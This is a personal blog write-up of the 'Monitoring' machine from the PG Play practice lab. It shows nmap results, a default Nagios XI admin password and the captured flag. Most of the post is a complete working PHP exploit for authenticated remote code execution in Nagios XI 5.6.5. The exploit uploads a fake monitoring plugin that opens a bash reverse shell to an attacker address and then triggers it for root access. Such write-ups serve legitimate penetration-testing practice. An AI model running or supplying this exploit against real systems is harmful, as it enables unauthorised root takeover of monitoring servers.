{"title":"[PG Play]--Monitoring","date":"2024-07-10T17:21:00.000Z","date_formatted":{"ll":"Jul 10, 2024","L":"07/10/2024","MM-DD":"07-10"},"link":"2024/07/10/[PG Play]--Monitoring","updated":"2024-08-19T11:08:08.654Z","content":"<h1 id=\"üíªenumeration\">üíªEnumeration<a title=\"#üíªenumeration\" href=\"#üíªenumeration\"></a></h1>\n<h2 id=\"üóíÔ∏ètcp\">üóíÔ∏èTCP<a title=\"#üóíÔ∏ètcp\" href=\"#üóíÔ∏ètcp\"></a></h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT    STATE SERVICE    VERSION</span><br><span class=\"line\">22/tcp  open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)</span><br><span class=\"line\">|   256 e7:bb:11:c1:2e:<span class=\"built_in\">cd</span>:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)</span><br><span class=\"line\">|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:<span class=\"built_in\">dd</span>:a3:6d:d1:4e:a4 (ED25519)</span><br><span class=\"line\">25/tcp  open  smtp       Postfix smtpd</span><br><span class=\"line\">|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class=\"line\">| ssl-cert: Subject: commonName=ubuntu</span><br><span class=\"line\">| Not valid before: 2020-09-08T17:59:00</span><br><span class=\"line\">|_Not valid after:  2030-09-06T17:59:00</span><br><span class=\"line\">|_ssl-<span class=\"built_in\">date</span>: TLS randomness does not represent time</span><br><span class=\"line\">80/tcp  open  tcpwrapped</span><br><span class=\"line\">|_http-title: Nagios XI</span><br><span class=\"line\">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class=\"line\">389/tcp open  ldap       OpenLDAP 2.2.X - 2.3.X</span><br><span class=\"line\">443/tcp open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">|_ssl-<span class=\"built_in\">date</span>: TLS randomness does not represent time</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/1.1</span><br><span class=\"line\">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US</span><br><span class=\"line\">| Not valid before: 2020-09-08T18:28:08</span><br><span class=\"line\">|_Not valid after:  2030-09-06T18:28:08</span><br><span class=\"line\">Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>\n<h2 id=\"üìóweb-services\">üìóWeb Services<a title=\"#üìóweb-services\" href=\"#üìóweb-services\"></a></h2>\n<h3 id=\"üóíÔ∏ènagios-xi\">üóíÔ∏èNagios XI<a title=\"#üóíÔ∏ènagios-xi\" href=\"#üóíÔ∏ènagios-xi\"></a></h3>\n<p>Week password is used: nagiosadmin/admin .</p>\n<p>Use above User/Password login Nagios XI and I found the release version is 5.6.0 .</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202408191615376.png\" alt=\"Untitled\" loading=\"lazy\" class=\"œÜbp\"></p>\n<p>Then I use  Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation Exploitation exploit it, and I got the root access.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202408191601281.png\" alt=\"Untitled\" loading=\"lazy\" class=\"œÜbp\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202408191601186.png\" alt=\"Untitled\" loading=\"lazy\" class=\"œÜbp\"></p>\n<h1 id=\"üèÜexploitation\">üèÜExploitation<a title=\"#üèÜexploitation\" href=\"#üèÜexploitation\"></a></h1>\n<p><strong>Service Exploited</strong>ÔºöNagios XI</p>\n<p><strong>Vulnerability Type</strong>ÔºöRCE</p>\n<ul>\n<li>\n<p><strong>DescriptionÔºö</strong></p>\n<p>Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation Exploitation could exploit it and  get the root access</p>\n</li>\n</ul>\n<hr>\n<p><strong>Discovery of Vulnerabitity</strong></p>\n<ul>\n<li>\n<p><strong>Exploit Code Used</strong></p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$userVal = parseArgs($argv);</span><br><span class=\"line\"></span><br><span class=\"line\">checkCookie();</span><br><span class=\"line\">$userVal[&#x27;loginNSP&#x27;] = extractNSP($userVal[&#x27;loginUrl&#x27;]);</span><br><span class=\"line\">authenticate($userVal);</span><br><span class=\"line\"></span><br><span class=\"line\">$userVal[&#x27;pluginNSP&#x27;] = extractNSP($userVal[&#x27;pluginUrl&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">uploadPayload($userVal);</span><br><span class=\"line\">triggerPayload($userVal);</span><br><span class=\"line\"></span><br><span class=\"line\">function extractNSP($url) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $curl = curl_init();</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);;</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEJAR, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEFILE, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;[+] Grabbing NSP from: &#123;$url&#125;\\n&quot;;</span><br><span class=\"line\">    $response = curl_exec($curl);</span><br><span class=\"line\">    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($httpCode == &#x27;200&#x27;) &#123;</span><br><span class=\"line\">        echo &quot;[+] Retrieved page contents from: &#123;$url&#125;\\n&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;[+] Unable to open page: &#123;$url&#125; to obtain NSP\\n&quot;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $DOM = new DOMDocument();</span><br><span class=\"line\">    @$DOM-&gt;loadHTML($response);</span><br><span class=\"line\">    $xpath = new DOMXpath($DOM);</span><br><span class=\"line\">    $input = $xpath-&gt;query(&#x27;//input[@name=&quot;nsp&quot;]&#x27;);</span><br><span class=\"line\">    $nsp = $input-&gt;item(0)-&gt;getAttribute(&#x27;value&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($nsp)) &#123;</span><br><span class=\"line\">        echo &quot;[+] Extracted NSP - value: &#123;$nsp&#125;\\n&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;[+] Unable to obtain NSP from &#123;$url&#125;\\n&quot;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return $nsp;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function authenticate($userVal) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $postValues = array(</span><br><span class=\"line\">        &#x27;username&#x27; =&gt; $userVal[&#x27;user&#x27;], &#x27;password&#x27; =&gt; $userVal[&#x27;pass&#x27;],</span><br><span class=\"line\">        &#x27;pageopt&#x27; =&gt; &#x27;login&#x27;, &#x27;nsp&#x27; =&gt; $userVal[&#x27;loginNSP&#x27;]</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    $curl = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_URL, $userVal[&#x27;loginUrl&#x27;]);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_POST, TRUE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($postValues));</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_REFERER, $userVal[&#x27;loginUrl&#x27;]);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEJAR, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEFILE, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;[+] Attempting to login...\\n&quot;;</span><br><span class=\"line\">    curl_exec($curl);</span><br><span class=\"line\">    if (curl_getinfo($curl, CURLINFO_HTTP_CODE) == &#x27;302&#x27;) &#123;</span><br><span class=\"line\">        echo &quot;[+] Authentication success\\n&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;[+] Unable to plguin, check your credentials\\n&quot;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;[+] Checking we have admin rights...\\n&quot;;</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_URL, $userVal[&#x27;pluginUrl&#x27;]);</span><br><span class=\"line\">    $response = curl_exec($curl);</span><br><span class=\"line\"></span><br><span class=\"line\">    $title = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">    $dom = new DOMDocument();</span><br><span class=\"line\">    if (@$dom-&gt;loadHTML($response)) &#123;</span><br><span class=\"line\">        $dom-&gt;getElementsByTagName(&quot;title&quot;)-&gt;length &gt; 0 ? $title = $dom-&gt;getElementsByTagName(&quot;title&quot;)-&gt;item(0)-&gt;textContent : FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (strpos($title, &#x27;Manage&#x27;) !== FALSE) &#123;</span><br><span class=\"line\">        echo &quot;[+] Admin access confirmed\\n&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;[+] Unable to reach login page, are you admin?\\n&quot;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function uploadPayload($userVal) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $payload = &quot;-----------------------------18467633426500\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\n\\n1\\n-----------------------------18467633426500\\nContent-Disposition: form-data; name=\\&quot;nsp\\&quot;\\n\\n&#123;$userVal[&#x27;pluginNSP&#x27;]&#125;\\n-----------------------------18467633426500\\nContent-Disposition: form-data; name=\\&quot;MAX_FILE_SIZE\\&quot;\\n\\n20000000\\n-----------------------------18467633426500\\nContent-Disposition: form-data; name=\\&quot;uploadedfile\\&quot;; filename=\\&quot;check_ping\\&quot;\\nContent-Type: text/plain\\n\\nbash -i &gt;&amp; /dev/tcp/&#123;$userVal[&#x27;reverseip&#x27;]&#125;/&#123;$userVal[&#x27;reverseport&#x27;]&#125; 0&gt;&amp;1\\n-----------------------------18467633426500--\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    $curl = curl_init();</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_URL, $userVal[&#x27;pluginUrl&#x27;]);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_POSTFIELDS, $payload);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_POST, 1);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_ENCODING, &#x27;gzip, deflate&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEFILE, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    $headers = array();</span><br><span class=\"line\">    $headers[] = &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Accept-Language: en-GB,en;q=0.5&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Referer: &#x27; . $userVal[&#x27;pluginUrl&#x27;];</span><br><span class=\"line\">    $headers[] = &#x27;Content-Type: multipart/form-data; boundary=---------------------------18467633426500&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Connection: keep-alive&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Upgrade-Insecure-Requests: 1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;[+] Uploading payload...\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = curl_exec($curl);</span><br><span class=\"line\">    $dom = new DOMDocument();</span><br><span class=\"line\">    @$dom-&gt;loadHTML($response);</span><br><span class=\"line\"></span><br><span class=\"line\">    $upload = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    foreach ($dom-&gt;getElementsByTagName(&#x27;div&#x27;) as $div) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        if ($div-&gt;getAttribute(&#x27;class&#x27;) === &#x27;message&#x27;) &#123;</span><br><span class=\"line\">            if (strpos($div-&gt;nodeValue, &#x27;New plugin was installed&#x27;) !== FALSE) &#123;</span><br><span class=\"line\">                $upload = TRUE;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($upload) &#123;</span><br><span class=\"line\">        echo &quot;[+] Payload uploaded\\n&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &#x27;[+] Unable to upload payload&#x27;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function triggerPayload($userVal) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $curl = curl_init();</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_URL, $userVal[&#x27;profileGenUrl&#x27;]);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_ENCODING, &#x27;gzip, deflate&#x27;);</span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_COOKIEFILE, &#x27;cookie.txt&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    $headers = array();</span><br><span class=\"line\">    $headers[] = &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Connection: keep-alive&#x27;;</span><br><span class=\"line\">    $headers[] = &#x27;Upgrade-Insecure-Requests: 1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;[+] Triggering payload: if successful, a reverse shell will spawn at &#123;$userVal[&#x27;reverseip&#x27;]&#125;:&#123;$userVal[&#x27;reverseport&#x27;]&#125;\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_exec($curl);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function showHelp() &#123;</span><br><span class=\"line\">    echo &quot;Usage: php exploit.php --host=example.com --ssl=[true/false] --user=username --pass=password --reverseip=ip --reverseport=port\\n&quot;;</span><br><span class=\"line\">    exit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function parseArgs($argv) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $userVal = array();</span><br><span class=\"line\">    for ($i = 1; $i &lt; count($argv); $i++) &#123;</span><br><span class=\"line\">        if (preg_match(&#x27;/^--([^=]+)=(.*)/&#x27;, $argv[$i], $match)) &#123;</span><br><span class=\"line\">            $userVal[$match[1]] = $match[2];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!isset($userVal[&#x27;host&#x27;]) || !isset($userVal[&#x27;ssl&#x27;]) || !isset($userVal[&#x27;user&#x27;]) || !isset($userVal[&#x27;pass&#x27;]) || !isset($userVal[&#x27;reverseip&#x27;]) || !isset($userVal[&#x27;reverseport&#x27;])) &#123;</span><br><span class=\"line\">        showHelp();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $userVal[&#x27;ssl&#x27;] == &#x27;true&#x27; ? $userVal[&#x27;proto&#x27;] = &#x27;https://&#x27; : $userVal[&#x27;proto&#x27;] = &#x27;http://&#x27;;</span><br><span class=\"line\">    $userVal[&#x27;loginUrl&#x27;] = $userVal[&#x27;proto&#x27;] . $userVal[&#x27;host&#x27;] . &#x27;/nagiosxi/login.php&#x27;;</span><br><span class=\"line\">    $userVal[&#x27;pluginUrl&#x27;] = $userVal[&#x27;proto&#x27;] . $userVal[&#x27;host&#x27;] . &#x27;/nagiosxi/admin/monitoringplugins.php&#x27;;</span><br><span class=\"line\">    $userVal[&#x27;profileGenUrl&#x27;] = $userVal[&#x27;proto&#x27;] . $userVal[&#x27;host&#x27;] . &#x27;/nagiosxi/includes/components/profile/profile.php?cmd=download&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    return $userVal;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function checkCookie() &#123;</span><br><span class=\"line\">    if (file_exists(&#x27;cookie.txt&#x27;)) &#123;</span><br><span class=\"line\">        echo &quot;cookie.txt already exists - delete prior to running&quot;;</span><br><span class=\"line\">        exit(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>Proof\\Local.txt File</strong></p>\n<p>903d4f67c7e7070cb7cee7ff025e8cd8</p>\n<ul class=\"œÜbr\">\n<li><input type=\"checkbox\" disabled=\"\" checked=\"\"><i></i> Submit Flag</li>\n</ul>\n<h1 id=\"üí°goodies\">üí°Goodies<a title=\"#üí°goodies\" href=\"#üí°goodies\"></a></h1>\n<h2 id=\"üîëpasswords\">üîëPasswords<a title=\"#üîëpasswords\" href=\"#üîëpasswords\"></a></h2>\n<p>Nagios XI : nagiosadmin/admin</p>\n<h2 id=\"üîëproof\\flags\\other\">üîëProof\\Flags\\Other<a title=\"#üîëproof\\flags\\other\" href=\"#üîëproof\\flags\\other\"></a></h2>\n<p>903d4f67c7e7070cb7cee7ff025e8cd8</p>\n<h1 id=\"üìÉmethodology\">üìÉMethodology<a title=\"#üìÉmethodology\" href=\"#üìÉmethodology\"></a></h1>\n<ul>\n<li>\n<p>üíæLog Book</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">None</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","next":{"title":"NotionÊäòËÖæ--MermaidÂõæË°®Â∑•ÂÖ∑","link":"2024/04/12/NotionÊäòËÖæ--MermaidÂõæË°®Â∑•ÂÖ∑"},"plink":"https://Lq0ne.github.io/2024/07/10/[PG Play]--Monitoring/","toc":[{"id":"üíªenumeration","title":"üíªEnumeration","index":"1","children":[{"id":"üóíÔ∏ètcp","title":"üóíÔ∏èTCP","index":"1.1"},{"id":"üìóweb-services","title":"üìóWeb Services","index":"1.2","children":[{"id":"üóíÔ∏ènagios-xi","title":"üóíÔ∏èNagios XI","index":"1.2.1"}]}]},{"id":"üèÜexploitation","title":"üèÜExploitation","index":"2"},{"id":"üí°goodies","title":"üí°Goodies","index":"3","children":[{"id":"üîëpasswords","title":"üîëPasswords","index":"3.1"},{"id":"üîëproof\\flags\\other","title":"üîëProof\\Flags\\Other","index":"3.2"}]},{"id":"üìÉmethodology","title":"üìÉMethodology","index":"4"}],"copyright":{"license":"‰∏™‰∫∫ÂéüÂàõ - Ëá™Áî±ËΩ¨ËΩΩ - ‰øùÊåÅÁΩ≤Âêç - Á¶ÅÊ≠¢ÂïÜÁî®","published":"July 10, 2024","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2024/07/10/[PG Play]--Monitoring/\" title=\"[PG Play]--Monitoring\">https://Lq0ne.github.io/2024/07/10/[PG Play]--Monitoring/</a>"},"reading_time":"1271 words in 8 min"}